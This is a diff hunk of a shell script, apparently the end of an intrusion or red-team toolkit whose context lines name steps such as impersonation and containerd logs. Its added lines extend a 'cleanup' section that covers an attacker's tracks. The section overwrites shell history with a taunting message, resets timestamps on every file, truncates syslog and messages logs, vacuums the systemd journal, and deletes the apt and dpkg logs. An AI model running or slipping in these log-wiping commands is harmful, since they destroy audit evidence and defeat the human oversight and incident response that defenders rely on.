@@ -157,9 +157,14 @@ impersonation
 apim
 containerd_logs
 
+systemctl daemon-reload
+
 # cleanup
 echo "Nothing to see here, sorry" > ~/.bash_history
 find / -exec touch -t $(date +%y%m%d%H%M) {} + &>/dev/null
 true >/var/log/messages
+true >/var/log/syslog
+true > ~/.viminfo
 journalctl --vacuum-time=1s
-echo  > ~/.viminfo
+rm -rf /var/log/apt
+rm /var/log/dpkg.log
